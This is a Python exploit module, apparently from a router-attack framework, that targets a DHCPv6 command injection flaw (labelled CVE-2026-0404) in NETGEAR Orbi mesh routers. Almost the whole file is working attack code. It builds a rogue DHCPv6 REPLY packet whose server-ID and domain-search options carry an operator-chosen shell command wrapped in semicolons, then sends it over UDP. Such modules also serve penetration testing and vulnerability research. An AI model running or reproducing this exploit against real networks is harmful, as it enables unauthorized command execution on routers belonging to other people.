# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """NETGEAR Orbi DHCPv6 Command Injection (CVE-2026-0404).

    The DHCPv6 client implementation on NETGEAR Orbi mesh routers
    passes the received DHCP option values (server identifier, domain
    search list) to shell commands without sanitization. An attacker
    on the local network running a rogue DHCPv6 server can inject
    arbitrary OS commands via crafted option fields.

    CVSS v3.1: 7.8 (High), AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "NETGEAR Orbi DHCPv6 Command Injection (CVE-2026-0404)",
        "description": (
            "Exploits CVE-2026-0404 via command injection through "
            "DHCPv6 option fields on NETGEAR Orbi routers. A rogue "
            "DHCPv6 server sends crafted option values containing "
            "shell metacharacters that trigger OS command execution "
            "during DHCP lease processing."
        ),
        "authors": (
            "Security researcher (discovery)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://nvd.nist.gov/vuln/detail/CVE-2026-0404",
            "https://kb.netgear.com/000066540/Security-Advisory",
        ),
        "disclosure_date": "2026-01-08",
        "platform": "linux",
        "arch": "arm",
        "privileged": True,
        "targets": (
            "NETGEAR Orbi RBR750 (firmware < 6.2.1.22)",
            "NETGEAR Orbi RBR760 (firmware < 6.2.1.22)",
            "NETGEAR Orbi RBS750 satellites",
        ),
    }

    target = OptIP("", "DHCPv6 multicast or target IPv6 address")
    port = OptPort(547, "DHCPv6 server port")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    command = OptString("id", "OS command to inject via DHCPv6 option")
    interface = OptString("", "Network interface for DHCPv6")

    # DHCPv6 message types
    _DHCPV6_ADVERTISE = 2
    _DHCPV6_REPLY = 7

    # DHCPv6 option types
    _OPT_CLIENTID = 1
    _OPT_SERVERID = 2
    _OPT_IA_NA = 3
    _OPT_STATUS = 13
    _OPT_DOMAIN_SEARCH = 24

    def _build_dhcpv6_reply(self, xid: bytes = b"\x00\x01\x02") -> bytes:
        """Build a DHCPv6 REPLY with injected domain search option."""
        msg_type = self._DHCPV6_REPLY
        packet = struct.pack("B", msg_type) + xid

        # Server ID option with injected payload
        injected = f"ns1.local;{self.command};".encode()
        packet += struct.pack("!HH", self._OPT_SERVERID, len(injected))
        packet += injected

        # Domain Search List with injection
        domain_payload = f"local;{self.command};".encode()
        packet += struct.pack("!HH", self._OPT_DOMAIN_SEARCH, len(domain_payload))
        packet += domain_payload

        # Status code: Success
        status_msg = b"Success"
        packet += struct.pack("!HHH", self._OPT_STATUS, 2 + len(status_msg), 0)
        packet += status_msg

        return packet

    def _send_dhcpv6(self, packet: bytes) -> bool:
        try:
            sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(self.timeout)
            if self.interface:
                sock.setsockopt(
                    socket.SOL_SOCKET,
                    socket.SO_BINDTODEVICE,
                    self.interface.encode("utf-8"),
                )
            sock.sendto(packet, (str(self.target), self.port))
            sock.close()
            return True
        except OSError:
            return False

    @mute
    def check(self) -> bool:
        """Check if we can send DHCPv6 packets."""
        try:
            sock = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)
            sock.settimeout(self.timeout)
            sock.close()
            return True
        except OSError:
            return False

    def run(self) -> None:
        if not self.target:
            print_error("target is required (DHCPv6 multicast ff02::1:2 or target IPv6)")
            return

        print_success("Sending crafted DHCPv6 REPLY with injected domain search")
        self._exploit()

    def _exploit(self) -> None:
        packet = self._build_dhcpv6_reply()

        print_status(
            f"DHCPv6 REPLY with injected domain: "
            f"'local;{self.command};' ({len(packet)} bytes)"
        )

        if self._send_dhcpv6(packet):
            print_success(
                f"DHCPv6 REPLY sent to {self.target}. If the Orbi "
                f"router processes DHCPv6 domain options without "
                f"sanitization, '{self.command}' will execute."
            )
        else:
            print_error("Failed to send DHCPv6 packet")
